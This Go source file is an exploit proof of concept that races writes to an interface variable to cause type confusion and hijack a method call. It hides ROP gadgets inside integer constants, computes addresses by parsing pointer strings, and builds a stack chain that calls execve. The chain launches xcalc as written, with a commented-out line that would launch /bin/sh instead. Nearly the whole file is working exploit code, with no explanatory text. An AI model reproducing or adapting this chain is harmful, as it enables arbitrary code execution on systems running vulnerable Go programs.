/*
go run race-interface.go
go run -race race-interface.go
GORACE=halt_on_error=1 go run -race race-interface.go
*/
package main

import "fmt"

func addrof(i interface{}) int {
	s := fmt.Sprintf("%p", i)[2:]

	addr := 0
	for len(s) > 0{
		addr *= 16
		addr += (int)(s[0]) + map[bool]int{true: -0x30, false: 10-0x61}[s[0] < 0x3a]
		s = s[1:]
	}

	return addr
}

type itf interface {
	X(v1 int)
}

type safe struct {
	f *int
}

func (s safe) X(v1 int) {
}

type unsafe struct {
	f func(v1 int)
}

func (u unsafe) X(v1 int) {
	if u.f != nil {
		u.f(v1)
	}
}

func rop_gadgets() {
	gadget := make([]int, 0x10)

	gadget[0] = 0xc35c58;	// 0x49 : pop rax; pop rsp; ret
	gadget[1] = 0xc35a5e5f;	// 0x4e : pop rdi; pop rsi; pop rdx; ret
	gadget[2] = 0x050f58;	// 0x5c : pop rax; syscall
}

func main() {
	var confused, good, bad itf

	stack := make([]int, 0x20)
	a_st := addrof(stack)
	a_rp := addrof(rop_gadgets)

	stack[0x0] = a_rp + 0x4e
	stack[0x1] = a_st + 0x10*8	// filename
	stack[0x2] = a_st + 0x8*8	// argv
	stack[0x3] = a_st + 0xc*8	// envp
	stack[0x4] = a_rp + 0x5c
	stack[0x5] = 0x3b			// SYS_execve

	// argv
	stack[0x8] = a_st + 0x10*8
	stack[0x9] = 0
	// envp
	stack[0xc] = a_st + 0x12*8
	stack[0xd] = 0

	//stack[0x10] = 0x0068732f6e69622f	// "/bin/sh\x00"
	stack[0x10] = 0x6e69622f7273752f	// "/usr/bin"
	stack[0x11] = 0x0000636c6163782f	// "/xcalc\x00"
	stack[0x12] = 0x3d59414c50534944	// "DISPLAY="
	stack[0x13] = 0x000000000000303a	// ":0\x00"

	rip := a_rp + 0x49
	good = &safe{f: &rip}
	bad = &unsafe{}

	confused = good
	go func() {
		var i int
		for {
			confused = bad
			func() {
				if i >= 0 {
					return
				}
			}()
			confused = good
		}
	}()

	for {
		confused.X(a_st)
	}
}
